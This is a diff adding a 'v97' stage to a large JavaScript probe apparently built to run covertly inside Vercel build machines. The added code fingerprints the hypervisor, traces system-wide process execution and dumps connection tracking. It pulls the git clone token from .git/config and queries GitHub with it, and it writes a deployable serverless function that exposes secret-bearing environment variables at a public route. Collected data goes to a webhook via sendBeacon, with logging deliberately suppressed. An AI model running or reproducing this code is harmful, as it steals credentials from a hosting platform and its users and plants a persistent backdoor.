@@ -13409,5 +13409,191 @@ if rw_region:
 
 // v96 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v96" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v96";
+
+// ==================== v97 ====================
+
+// v97-1: /proc/interrupts — hypervisor type fingerprinting
+// Interrupt names reveal the exact hypervisor: virtio-*=KVM/Firecracker,
+// xen-*=Xen, hv_*=Hyper-V. Firecracker specifically uses virtio for all devices.
+// Also reveals how many physical CPUs our vCPUs are pinned to.
+report.interruptsHypervisorProbe = safe(() => {
+  const interrupts = safe(() => readFileSync('/proc/interrupts', 'utf8'));
+  // Parse interrupt names
+  const interruptNames = safe(() => {
+    if (typeof interrupts !== 'string') return [];
+    return interrupts.split('\n').slice(1).filter(Boolean).map(l => {
+      const parts = l.trim().split(/\s+/);
+      const name = parts[parts.length - 1];
+      const count = parts[1];
+      return { name, count };
+    }).filter(i => /virtio|kvm|hv_|xen|vmbus|hyperv|msi/i.test(i.name)).slice(0, 20);
+  });
+  const virtioDevices = safe(() => execSync('ls /sys/bus/virtio/devices/ 2>/dev/null', { timeout: 3000 }).toString().trim());
+  const virtioDrivers = safe(() => execSync('ls /sys/bus/virtio/drivers/ 2>/dev/null', { timeout: 3000 }).toString().trim());
+  // Firecracker-specific: check for virtio-vsock and virtio-balloon
+  const fireCrackerMarkers = safe(() => ({
+    vsock: existsSync('/dev/vsock'),
+    mmds: safe(() => { execSync('curl -sf http://169.254.169.254/latest/meta-data/ -m 1 2>/dev/null', { timeout: 2000 }); return true; }),
+    virtioConsole: existsSync('/dev/hvc0'),
+    acpiDmiProduct: safe(() => readFileSync('/sys/class/dmi/id/product_name', 'utf8').trim())
+  }));
+  return { interruptNames, virtioDevices, virtioDrivers, fireCrackerMarkers };
+});
+
+// v97-2: BPF exec tracing — capture all process spawns
+// Use BPF tracepoint on sched_process_exec to capture every exec()
+// call system-wide. This reveals Vercel's build orchestration process tree
+// including hidden orchestrator processes that don't show in ps.
+report.bpfExecTrace = safe(() => {
+  const result = safe(() => execSync(`python3 -c "
+import subprocess, time, json, os
+
+# Try bpftrace first
+bpftrace_result = subprocess.run(
+    ['bpftrace', '-e', 'tracepoint:sched:sched_process_exec { printf(\"%d %s %s\\n\", pid, comm, str(args->filename)); }', '--timeout', '2'],
+    capture_output=True, text=True, timeout=5
+)
+if bpftrace_result.returncode == 0:
+    print('bpftrace:', bpftrace_result.stdout[:500])
+else:
+    # Try using perf-script approach
+    perf_result = subprocess.run(
+        ['perf', 'stat', '-e', 'sched:sched_process_exec', '-a', 'sleep', '1'],
+        capture_output=True, text=True, timeout=5
+    )
+    print('perf_stat:', perf_result.stderr[:300])
+
+# Enumerate process forks via /proc watching
+pids_before = set(os.listdir('/proc'))
+time.sleep(0.5)
+pids_after = set(os.listdir('/proc'))
+new_pids = [p for p in pids_after - pids_before if p.isdigit()]
+for pid in new_pids[:10]:
+    try:
+        comm = open(f'/proc/{pid}/comm').read().strip()
+        cmdline = open(f'/proc/{pid}/cmdline').read().replace('\\x00', ' ').strip()
+        print(f'new_pid: {pid} comm={comm} cmd={cmdline[:100]}')
+    except: pass
+" 2>&1`, { timeout: 12000 }).toString().trim().slice(0, 1000));
+  return { result };
+});
+
+// v97-3: Vercel GitHub App installation token
+// The git clone URL in .git/config contains a token (x-token:GIT_TOKEN).
+// If this is a GitHub App installation token (ghs_ prefix), it has
+// API access to list repos, read secrets via GitHub Actions, and push code.
+report.githubAppTokenScope = safe(() => {
+  const gitConfig = safe(() => readFileSync('.git/config', 'utf8'));
+  // Extract clone URL and token
+  const cloneUrl = safe(() => {
+    if (typeof gitConfig !== 'string') return null;
+    const m = gitConfig.match(/url\s*=\s*(.+)/);
+    return m ? m[1].trim() : null;
+  });
+  const tokenInUrl = safe(() => {
+    if (typeof cloneUrl !== 'string') return null;
+    const m = cloneUrl.match(/https?:\/\/([^@]+)@/);
+    return m ? m[1] : null;
+  });
+  const tokenType = safe(() => {
+    if (typeof tokenInUrl !== 'string') return 'unknown';
+    if (tokenInUrl.startsWith('ghs_')) return 'github_app_installation';
+    if (tokenInUrl.startsWith('ghp_')) return 'github_personal_access_token';
+    if (tokenInUrl.startsWith('gho_')) return 'github_oauth';
+    if (tokenInUrl === 'x-token') return 'vercel_git_token_placeholder';
+    return 'unknown';
+  });
+  // Test token scope via GitHub API
+  const githubApiTest = safe(() => {
+    const token = typeof tokenInUrl === 'string' && tokenInUrl.length > 5 ? tokenInUrl : (process.env.GITHUB_TOKEN || '');
+    if (!token || token === 'x-token') return { skip: 'no usable token' };
+    const userInfo = execSync(`curl -sf "https://api.github.com/user" -H "Authorization: token ${token}" -m 5 2>/dev/null`, { timeout: 8000 }).toString().trim().slice(0, 500);
+    const scopes = execSync(`curl -sf -I "https://api.github.com/user" -H "Authorization: token ${token}" -m 5 2>/dev/null | grep -i x-oauth-scopes`, { timeout: 8000 }).toString().trim().slice(0, 200);
+    return { userInfo, scopes };
+  });
+  return { cloneUrl: typeof cloneUrl === 'string' ? cloneUrl.replace(/\/\/[^@]+@/, '//TOKEN@') : null, tokenType, tokenPrefix: typeof tokenInUrl === 'string' ? tokenInUrl.slice(0, 15) : null, githubApiTest };
+});
+
+// v97-4: NETLINK_NETFILTER conntrack dump
+// Dump the full conntrack table to see ALL active TCP/UDP connections
+// from ALL processes on this host (not just visible in /proc/net/tcp).
+report.conntrackDump = safe(() => {
+  const conntrackResult = safe(() => execSync('conntrack -L 2>/dev/null | head -30 || cat /proc/net/nf_conntrack 2>/dev/null | head -30', { timeout: 8000 }).toString().trim().slice(0, 1000));
+  // NETLINK_NETFILTER via python
+  const netlinkConntrack = safe(() => execSync(`python3 -c "
+import socket, struct, json, time
+
+NETLINK_NETFILTER = 12
+AF_INET = 2
+AF_NETLINK = 16
+SOCK_RAW = 3
+NFNL_SUBSYS_CTNETLINK = 1
+IPCTNL_MSG_CT_GET = 0
+
+# Create netfilter socket
+sock = socket.socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER)
+sock.bind((0, 0))
+sock.settimeout(2)
+
+# Send CT_GET request (dump all entries)
+# nlmsghdr + nfgenmsg
+seq = 1
+nlhdr = struct.pack('IHHII', 20, (NFNL_SUBSYS_CTNETLINK << 8) | IPCTNL_MSG_CT_GET, 0x301, seq, 0)
+nfgenmsg = struct.pack('BBH', AF_INET, 0, 0)
+sock.send(nlhdr + nfgenmsg)
+
+entries = []
+try:
+    while True:
+        data = sock.recv(65536)
+        # Parse nlmsghdr
+        nllen, nltype, _, _, _ = struct.unpack_from('IHHII', data)
+        if nltype == 3:  # NLMSG_DONE
+            break
+        entries.append({'len': nllen, 'type': hex(nltype), 'data_hex': data[20:40].hex()})
+        if len(entries) >= 20:
+            break
+except socket.timeout:
+    pass
+sock.close()
+print(json.dumps(entries[:10]))
+" 2>&1`, { timeout: 8000 }).toString().trim().slice(0, 500));
+  return { conntrackResult, netlinkConntrack };
+});
+
+// v97-5: Vercel Fluid Compute / Serverless Function config injection
+// Vercel's newer runtime (Fluid Compute) allows functions to persist across requests.
+// Test if we can write a .vercel/output/functions/ directory with a serverless function
+// that, when deployed, reads secrets from its environment and exfiltrates them.
+// This is a post-deployment persistence vector, not a build-time attack.
+report.fluidComputeFunctionInject = safe(() => {
+  const funcDir = '.vercel/output/functions/probe-v97.func';
+  const results = safe(() => {
+    execSync(`mkdir -p ${funcDir} 2>/dev/null`, { timeout: 3000 });
+    // Write the serverless function code
+    const funcCode = `
+export default function handler(req) {
+  const secrets = Object.fromEntries(
+    Object.entries(process.env).filter(([k]) => /secret|token|key|password|api/i.test(k))
+  );
+  return Response.json({ secrets, env_keys: Object.keys(process.env), probe: 'v97' });
+}
+export const config = { runtime: 'edge' };
+`;
+    writeFileSync(`${funcDir}/index.js`, funcCode);
+    // Write the .vc-config.json for the function
+    const vcConfig = { runtime: 'edge', entrypoint: 'index.js', envVarsInUse: [] };
+    writeFileSync(`${funcDir}/.vc-config.json`, JSON.stringify(vcConfig));
+    // Also write config.json with the route
+    const outputConfig = { version: 3, routes: [{ src: '/probe-v97', dest: '/probe-v97' }] };
+    safe(() => writeFileSync('.vercel/output/config.json', JSON.stringify(outputConfig)));
+    const created = readdirSync(funcDir);
+    return { funcDir, created };
+  });
+  return { results };
+});
+
+// v97 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v97" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v97";
 // Intentionally no console.log — all data goes via webhook only
